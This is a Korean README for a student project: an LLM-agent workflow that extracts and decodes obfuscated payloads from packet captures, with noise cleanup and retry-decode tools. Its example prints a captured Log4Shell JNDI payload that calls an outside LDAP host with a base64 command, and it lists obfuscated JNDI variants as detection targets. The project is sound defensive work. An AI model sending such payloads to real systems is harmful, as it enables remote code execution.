# 7주차 AI Agent 구현 프로젝트

## 프로젝트 개요

본 프로젝트는 패킷 분석 과정에서 발견되는 인코딩/난독화 payload를 자동으로 추출하고, 1차 디코딩 결과를 기반으로 후속 처리 전략을 결정하는 Agent 기반 workflow이다.

일반적인 패킷 분석에서는 base64, Basic Auth, Log4Shell obfuscation, `/Base64/` 경로 payload 등 다양한 형태의 인코딩 문자열이 발견된다. 1차 디코딩 도구만으로는 정상적으로 해석된 후보와 실패 후보, 암호화로 인해 제외해야 하는 스트림, 추가 검증이 필요한 residue 후보를 명확히 구분하기 어렵다.

본 프로젝트는 이를 해결하기 위해 다음과 같은 흐름을 구성하였다.

1. `tshark` JSON/NDJSON 결과에서 분석 가능한 payload segment를 추출한다.
2. segment 단위로 1차 디코딩을 수행한다.
3. 디코딩 결과를 사전 점검하여 `.done` 또는 `.pending` strategy 파일을 생성한다.
4. `.pending` 상태의 파일은 LLM Agent가 검토한다.
5. Agent는 필요 시 노이즈 제거 Tool을 호출하고, 재디코딩 Tool을 통해 최종 결과에 도달한다.

본 프로젝트에서 LLM은 디코딩 자체를 직접 수행하지 않는다. 디코딩 실행은 deterministic script가 담당하고, LLM Agent는 디코딩 결과 중 애매한 상태를 해석하여 다음 행동을 결정하는 역할을 수행한다.

---

## 전체 처리 흐름

```text
tshark JSON / NDJSON
  ↓
json_segmenter.py
  ↓
data/segments/*_segments.json
  ↓
encoding_decode_tool.py
  ↓
data/decoded/*_decoded.json
  ↓
strategy_precheck.py
  ↓
data/strategy/*_strategy.pending.json 또는 .done.json
  ↓
llm_agent.py
  ├─ needs_llm_review == true
  │    ├─ LLM 판단
  │    └─ noise_cleanup_tool.py 호출
  │
  └─ required_next_action == run_encoding_decode_tool
       └─ retry_encoding.py 호출
  ↓
data/strategy/*_strategy.done.json
````

---

## 6주차 설계와의 연결

6주차에서는 패킷 분석 workflow 중 Agent가 개입할 구간을 “디코딩 실패 또는 애매한 후보를 후속 처리하는 구간”으로 제한하였다.

7주차 구현에서는 이 설계를 유지하되, 실제 파일 상태 기반 workflow로 확장하였다.

* 1차 디코딩은 deterministic script가 수행한다.
* 디코딩 결과는 strategy 파일로 상태화한다.
* `.pending.json` 상태의 파일만 Agent가 검토한다.
* Agent는 모든 데이터를 직접 분석하지 않고, failed candidate / residue / excluded stream 등 구조화된 결과만 보고 후속 처리를 결정한다.
* 필요한 경우 Agent가 Tool을 호출하여 noise cleanup 및 retry decode를 수행한다.

초기에는 `encoding_decode_tool.py`가 retry 처리까지 담당하는 구조도 고려했으나, 최초 디코딩 입력과 retry 입력의 구조가 달라 최종적으로 역할을 분리하였다.

* `encoding_decode_tool.py`: `data/segments/*_segments.json` 기반 1차 디코딩 전용
* `llm_agents/retry_encoding.py`: `data/strategy/*.pending.json` 내부 `normalized_candidates` 기반 재디코딩 전용

---

## AI Agent의 역할

본 프로젝트에서 AI Agent의 역할은 payload 디코딩 자체가 아니라, **디코딩 결과에 대한 판단과 Tool orchestration**이다.

Agent는 다음과 같은 판단을 담당한다.

* failed candidate가 단순 artifact인지, 재시도 가치가 있는 후보인지 판단
* visible payload는 디코딩되었지만 failed artifact가 남은 경우 stop 여부 판단
* TLS/SSL처럼 복호화 키 없이는 payload 확인이 어려운 경우 `stop_with_exclusion` 판단
* 같은 도구를 재시도할지, 다른 분석 도구를 호출할지 결정
* `noise_cleanup_tool.py`에 전달할 옵션 선택
* `.pending.json` 상태를 다음 처리 단계로 전이

즉, LLM을 모든 데이터를 처리하는 만능 분석기로 사용하지 않고, rule-based tool이 처리하기 어려운 애매한 상태 판단과 tool orchestration에 한정하여 사용하였다.

---

## 사용한 Tool 및 Script

### Agent-callable Tools

| Tool 이름                            | 역할                                                    | Agent 호출 방식                                                                        |
| ---------------------------------- | ----------------------------------------------------- | ---------------------------------------------------------------------------------- |
| `llm_agents/noise_cleanup_tool.py` | failed candidate의 노이즈 제거 및 `normalized_candidates` 생성 | LLM decision이 `retry_same_tool`일 때 `llm_agent.py`가 호출                              |
| `llm_agents/retry_encoding.py`     | `normalized_candidates` 재디코딩 및 `.done.json` 전환        | 다음 batch에서 `required_next_action=run_encoding_decode_tool` 상태이면 `llm_agent.py`가 호출 |

### Pipeline Scripts

| 파일 이름                     | 역할                                                       |
| ------------------------- | -------------------------------------------------------- |
| `json_segmenter.py`       | `tshark` JSON/NDJSON 결과를 stream/segment 단위로 변환           |
| `encoding_decode_tool.py` | segment 기반 1차 디코딩 수행                                     |
| `strategy_precheck.py`    | decoded 결과를 `.pending`/`.done` strategy로 분류              |
| `llm_config_generate.py`  | LLM provider/model/API key/profile 설정 생성                 |
| `llm_agent.py`            | pending 상태 라우팅, LLM 판단, Agent-callable Tool 호출, 상태 전이 관리 |

---

## 파일별 기능

### `json_segmenter.py`

`tshark` JSON 또는 NDJSON 결과를 읽어 패킷을 stream/segment 단위로 재구성하고, HTTP/DNS/TCP payload 등 디코딩 대상 segment를 추출한다.

주요 기능:

* `tshark -T json`, `tshark -T ek` 형식 지원
* frame, IP, TCP/UDP, HTTP, DNS 계층 정보 추출
* stream key 생성
* HTTP Authorization, URI, User-Agent, TCP payload 추출
* TLS/SSL 또는 443/636 계열 암호화 스트림을 제외 대상으로 분류

이 단계는 원본 패킷 데이터를 디코딩 도구가 처리하기 쉬운 segment JSON으로 변환하는 전처리 단계이다. 

---

### `encoding_decode_tool.py`

`data/segments/*_segments.json`을 입력으로 받아 1차 디코딩을 수행한다.

주요 기능:

* HTTP Basic Auth base64 디코딩
* Log4Shell obfuscation 정규화
* `/Base64/` 경로 내부 base64 payload 추출 및 디코딩
* decoded candidates / failed candidates / residue candidates / excluded streams 분리
* 결과를 `data/decoded/*_decoded.json`으로 저장

이 도구는 최초 디코딩 executor 역할을 하며, strategy pending 재처리는 담당하지 않는다. 

---

### `strategy_precheck.py`

`data/decoded/*_decoded.json` 결과를 검사하여 후속 처리 전략을 생성한다.

주요 기능:

* decoded candidate 존재 여부 확인
* failed candidate 존재 여부 확인
* residue candidate 존재 여부 확인
* encrypted/excluded stream 존재 여부 확인
* LLM 검토 필요 여부 판단
* `.done.json` 또는 `.pending.json` strategy 파일 생성
* LLM Agent가 사용할 `llm_review_prompt` 생성

예를 들어 1차 디코딩은 성공했지만 failed candidate가 남아 있는 경우, `decoded_with_failed_artifacts` 상태로 분류하고 LLM 검토 대상으로 `.pending.json`을 생성한다. 

---

### `llm_config_generate.py`

LLM 호출 설정 파일을 생성하는 스크립트이다.

주요 기능:

* OpenAI / Gemini provider 선택
* API Key 입력 또는 환경변수 사용
* 모델 목록 조회
* 모델 선택
* profile 이름 생성
* `config/llm_config.json` 저장
* `active_profile` 설정 및 조회

이를 통해 `llm_agent.py`는 코드 수정 없이 설정 파일을 참조하여 LLM provider와 모델을 선택할 수 있다. 

---

### `llm_agent.py`

본 프로젝트의 핵심 Agent이다.

`data/strategy/*.pending.json`을 읽고, pending 파일의 상태에 따라 다음 작업을 라우팅한다.

```text
needs_llm_review == true
  → LLM 호출
  → stop이면 done 처리
  → retry_same_tool이면 noise_cleanup_tool.py 호출

needs_llm_review == false
required_next_action == run_encoding_decode_tool
  → LLM 재호출 없이 retry_encoding.py 호출
```

주요 기능:

* 모든 pending strategy 파일 확인
* LLM 리뷰 필요 여부 판단
* LLM decision 파싱
* `stop`, `stop_with_exclusion`, `retry_same_tool`, `call_other_tool` 처리
* LLM이 추천한 Tool 옵션 검증
* base64 trailing noise 옵션 보정
* `noise_cleanup_tool.py` 호출
* `retry_encoding.py` 호출
* 처리 로그를 `log/*.jsonl`로 저장

특히 LLM이 `trim_trailing_base64_chars` 같은 옵션을 누락해도, Agent가 deterministic 보정 로직을 통해 trailing `0` 같은 base64-valid noise 상황을 보완하도록 구성하였다. 

---

### `llm_agents/noise_cleanup_tool.py`

LLM Agent가 `retry_same_tool`이 필요하다고 판단한 경우 호출되는 노이즈 정규화 도구이다.

주요 기능:

* failed candidate 추출
* whitespace 제거
* URL decoding
* invalid base64 문자 제거
* base64 padding repair
* trailing noise 제거
* trailing `0`처럼 base64 alphabet에는 포함되지만 실제로는 노이즈일 수 있는 문자 제거
* `normalized_candidates` 생성

이 도구는 최종 디코딩 판정을 내리지 않고, 재디코딩을 위한 후보군을 생성하는 전처리 도구이다.

---

### `llm_agents/retry_encoding.py`

`noise_cleanup_tool.py`가 생성한 `normalized_candidates`를 실제로 재디코딩하는 retry 도구이다.

주요 기능:

* `required_next_action == run_encoding_decode_tool` 상태의 strategy pending 처리
* `normalized_candidates` 읽기
* base64 재디코딩
* 성공 후보 선택
* 최종 decoded candidate 병합
* 성공 시 `.pending.json`을 `.done.json`으로 전환

이 도구는 기존 `encoding_decode_tool.py`를 수정하지 않고, strategy pending 전용 retry executor로 분리한 것이다.

---

## 실행 방법

```powershell
# 1. LLM config 생성
py .\llm_config_generate.py

# 2. tshark JSON을 segment 파일로 변환
py .\json_segmenter.py

# 3. segment 기반 1차 디코딩
py .\encoding_decode_tool.py

# 4. decoded 결과를 strategy 상태 파일로 변환
py .\strategy_precheck.py

# 5. LLM Agent 실행
py .\llm_agent.py

# 6. 다음 batch에서 동일 Agent 재실행
#    required_next_action 상태를 보고 retry_encoding.py를 자동 호출
py .\llm_agent.py
```

필요한 환경 변수 또는 설정:

```powershell
# Gemini 사용 시
$env:GEMINI_API_KEY="..."

# OpenAI 사용 시
$env:OPENAI_API_KEY="..."
```

또는 `llm_config_generate.py` 실행 중 API Key를 직접 입력하여 `config/llm_config.json`에 profile로 저장할 수 있다.

---

## 적용 사례

### 1. 1차 디코딩 결과

본 프로젝트에서는 Log4Shell 유형의 payload를 포함한 샘플 패킷을 대상으로 Agent workflow를 적용하였다.

1차 디코딩 단계에서 HTTP Basic Auth 내부에 포함된 Log4Shell payload가 확인되었다.

```text
log4shell:${${::-j}ndi:ldap://34.91.73.37:1389/Basic/Command/Base64/cGluZyAtYyAxMCAxLjEuMS4x}
```

Log4Shell obfuscation 정규화 후 nested base64 payload도 정상 디코딩되었다.

```text
cGluZyAtYyAxMCAxLjEuMS4x
↓
ping -c 10 1.1.1.1
```

하지만 일부 TCP segment에서는 다음과 같은 failed candidate가 남았다.

```text
cGluZyAtYyAxMCAxLjEuMS4x0
```

이 값은 기존 base64 문자열 뒤에 `0`이 붙은 형태이다. 문제는 `0`이 base64 alphabet에 포함되는 문자이기 때문에 단순한 invalid character 제거로는 노이즈를 제거할 수 없다는 점이다.

---

### 2. Strategy Precheck 판단

`strategy_precheck.py`는 1차 디코딩은 성공했지만 failed candidate가 남아 있는 상태로 판단하였다.

```text
completion_status = decoded_with_failed_artifacts
needs_llm_review = true
required_next_action = review_failed_candidates
```

즉, 단순히 성공으로 종료하지 않고 LLM Agent에게 failed candidate의 재검토를 요청하였다.

---

### 3. LLM Agent 판단

`llm_agent.py`는 pending strategy 파일을 읽고 LLM에게 검토를 요청하였다.

LLM은 failed candidate에 trailing `0` noise가 있을 가능성이 있다고 판단하고, 다음 decision을 반환하였다.

```json
{
  "decision": "retry_same_tool",
  "completion_status": "decoded_with_failed_artifacts",
  "requires_additional_verification": true,
  "recommended_tool": "noise_cleanup_tool",
  "recommended_options": {
    "strip_trailing_noise": true,
    "strip_invalid_base64_chars": true,
    "repair_base64_padding": true,
    "trim_trailing_base64_chars": true,
    "max_trailing_trim": 3
  }
}
```

이 단계에서 Agent는 LLM 판단을 그대로 사용하는 데 그치지 않고, 필요한 경우 trailing base64 noise 옵션을 보정하여 Tool 호출 안정성을 높였다.

---

### 4. Noise Cleanup 결과

`noise_cleanup_tool.py`는 failed candidate에 대해 여러 정규화 variant를 생성하였다.

원본 failed candidate:

```text
cGluZyAtYyAxMCAxLjEuMS4x0
```

정규화된 성공 candidate:

```text
cGluZyAtYyAxMCAxLjEuMS4x
```

디코딩 결과:

```text
ping -c 10 1.1.1.1
```

즉, trailing `0`이 노이즈였음을 확인하고 정상 payload를 복구하였다.

---

### 5. Retry Encoding 결과

다음 Agent 실행 시 `llm_agent.py`는 같은 pending 파일을 다시 확인하였다.

이때 파일 상태는 다음과 같았다.

```text
needs_llm_review = false
required_next_action = run_encoding_decode_tool
```

따라서 LLM을 다시 호출하지 않고, `llm_agents/retry_encoding.py`를 호출하였다.

`retry_encoding.py`는 `normalized_candidates`를 재디코딩하고 최종 성공 후보를 strategy 결과에 병합하였다.

최종 상태:

```text
decision = stop
completion_status = retry_decode_success
needs_llm_review = false
required_next_action = null
```

즉, Agent workflow가 failed candidate를 재처리하여 최종 `.done.json` 상태까지 도달하였다.

---

## 실행 로그

`llm_agent.py`는 실행 내역을 `log/*.jsonl`에 저장한다.

주요 이벤트:

```text
agent_start
classify_pending
process_llm_review_start
llm_response_received
llm_decision
action_result
process_retry_encoding_start
retry_encoding_result
process_retry_encoding_done
agent_finish
```

이를 통해 Agent가 어떤 pending 파일을 어떤 route로 분류했는지, LLM이 어떤 decision을 반환했는지, 어떤 Tool이 호출되었는지 확인할 수 있다.

---

## 성공 판정 기준

| 기준                           | 결과 | 내용                                                                     |
| ---------------------------- | -- | ---------------------------------------------------------------------- |
| Agent-callable Tool 2개 이상 구현 | 충족 | `noise_cleanup_tool.py`, `retry_encoding.py`                           |
| LLM이 Tool 사용 여부 판단           | 충족 | `retry_same_tool`, `stop`, `stop_with_exclusion` decision 사용           |
| Tool 결과를 observation으로 사용    | 충족 | `noise_cleanup_tool.py` 결과인 `normalized_candidates`를 strategy 파일에 병합   |
| 후속 Tool 호출                   | 충족 | 다음 batch에서 `retry_encoding.py` 호출                                      |
| 종료 조건 존재                     | 충족 | `stop`, `stop_with_exclusion`, `retry_decode_success`, `.done.json` 전환 |
| Tool 실패 처리                   | 충족 | Tool 미존재/실패 시 error 기록                                                 |
| 실행 로그 저장                     | 충족 | `log/llm_agent_events.jsonl`, `log/llm_agent_run_*.jsonl` 생성           |

---

## 향후 확장 로드맵

현재 구현은 base64 계열 failed candidate와 trailing noise case를 중심으로 검증하였다. 실제 패킷 분석에서는 다양한 인코딩/난독화/분할 전송 케이스가 발생할 수 있으므로, 향후 Agent가 호출할 수 있는 Tool을 확장할 수 있다.

### 1. URL Encoding / Double Encoding Tool

예상 Tool:

```text
llm_agents/url_decode_tool.py
```

예상 처리 대상:

```text
%24%7Bjndi%3Aldap%3A%2F%2F...
%2524%257Bjndi%253Aldap...
```

역할:

* URL encoded payload 복원
* double URL encoding 탐지
* `%xx` escape sequence 정규화
* 복원 후 base64/log4shell 후보 재추출

---

### 2. Fragment Reassembly Tool

예상 Tool:

```text
llm_agents/fragment_reassembly_tool.py
```

예상 처리 대상:

```text
segment 1: cGluZyAt
segment 2: YyAxMCAx
segment 3: LjEuMS4x
```

역할:

* 동일 stream 내 인접 segment 후보 재조립
* base64-like fragment merge
* 순서 기반 payload 복원
* 재조립 후 retry encoding 수행

---

### 3. Log4Shell Obfuscation Deep Normalize Tool

예상 Tool:

```text
llm_agents/log4shell_normalize_tool.py
```

예상 처리 대상:

```text
${${lower:j}${upper:n}${::-d}${::-i}:ldap://...}
${${::-j}${::-n}${::-d}${::-i}:ldap://...}
```

역할:

* 중첩 Log4Shell obfuscation 정규화
* `${lower:}`, `${upper:}`, `${::-x}` 반복 해석
* JNDI URI 추출
* URI 내부 encoding candidate 추출

---

### 4. Compression Decode Tool

예상 Tool:

```text
llm_agents/compression_decode_tool.py
```

예상 처리 대상:

```text
base64(gzip(payload))
base64(zlib(payload))
```

역할:

* base64 decode 후 magic byte 확인
* gzip/zlib/deflate decompress
* decompressed payload에서 추가 encoding candidate 추출

---

### 5. Simple Cipher Probe Tool

예상 Tool:

```text
llm_agents/simple_cipher_probe_tool.py
```

역할:

* single-byte XOR 후보 탐색
* printable ratio 기반 scoring
* known keyword 기반 후보 ranking
* 악성 문자열 또는 URL 후보 추출

---

### 6. TLS Metadata Review Tool

예상 Tool:

```text
llm_agents/tls_metadata_review_tool.py
```

역할:

* encrypted stream metadata 요약
* SNI / certificate / JA3 계열 정보 추출
* payload decode 불가 사유 명시
* `stop_with_exclusion` 판단 근거 제공

---

### 7. Candidate Ranking Tool

예상 Tool:

```text
llm_agents/candidate_ranker_tool.py
```

역할:

* 여러 normalization/retry 후보 통합
* 중복 candidate 제거
* decoded payload completeness 평가
* 최종 representative candidate 선택

---

## 확장 방향 요약

```text
현재:
LLM Agent
  ├─ noise_cleanup_tool
  └─ retry_encoding

확장:
LLM Agent
  ├─ noise_cleanup_tool
  ├─ retry_encoding
  ├─ url_decode_tool
  ├─ fragment_reassembly_tool
  ├─ log4shell_normalize_tool
  ├─ compression_decode_tool
  ├─ simple_cipher_probe_tool
  ├─ tls_metadata_review_tool
  └─ candidate_ranker_tool
```

본 과제에서는 범위를 제한하기 위해 base64 trailing noise case를 중심으로 구현했으며, 향후에는 위 Tool들을 단계적으로 추가하여 더 다양한 실패 유형을 처리할 수 있다.

---

## 구현하며 배운 점

* LLM은 디코딩 자체를 수행하기보다, 실패 후보를 보고 어떤 도구를 다시 호출할지 판단하는 역할에 더 적합했다.
* 패킷 분석 workflow에서는 단순한 `success/fail`보다 `pending/done/failed` 상태 관리가 중요하다.
* Tool의 입력 구조가 다르면 하나의 도구에 억지로 기능을 추가하기보다, 역할별로 분리하는 것이 유지보수에 유리하다.
* LLM이 옵션을 누락할 수 있으므로, Agent에는 deterministic 보정 로직이 필요하다.
* trailing `0`처럼 base64 alphabet에는 포함되지만 실제로는 노이즈인 경우는 일반적인 invalid character 제거로 해결되지 않는다.
* Agent workflow는 LLM 호출 자체가 아니라, `decide → tool call → observe → next action → stop` 구조가 실제로 동작해야 의미가 있다.
